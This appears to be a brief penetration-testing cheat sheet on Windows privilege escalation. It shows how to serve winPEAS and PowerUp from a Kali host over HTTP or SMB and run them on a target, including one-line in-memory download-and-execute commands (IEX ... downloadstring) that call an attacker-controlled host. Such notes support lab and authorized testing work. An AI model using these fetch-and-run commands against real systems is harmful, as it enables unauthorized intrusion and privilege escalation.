# Privilege Escalation

## Linux


## Windows

### winPEAS

- HTTP

Host the file
```
cd /usr/share/windows-resources/binaries
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/winPEASany.exe' -OutFile <Path>\winPEASany.exe
<Path>\winPEASany.exe
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/winPEASany.exe')
```

- SMB

Host the file
```
cd /usr/share/windows-resources/binaries
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\winPEASany.exe .
winPEASany.exe
```

### PowerUp

- HTTP

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
sudo python -m http.server 80
```

Copy on Target and execute
```
Invoke-WebRequest -Uri 'http://<Kali IP>/PowerUp.ps1' -OutFile <Path>\PowerUp.ps1
Import-Module <Path>\PowerUp.ps1
Invoke-AllChecks
```
Or execute direct on memory
```
IEX(New-Object Net.WebClient).downloadstring('http://<Kali IP>/PowerUp.ps1')
Invoke-AllChecks
```

- SMB

Host the file
```
cd /usr/share/windows-resources/powersploit/Privesc/
impacket-smbserver share $(pwd) -smb2support
```

```
net use \\<Kali IP>\share
copy \\<Kali IP>\share\PowerUp.ps1 .
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
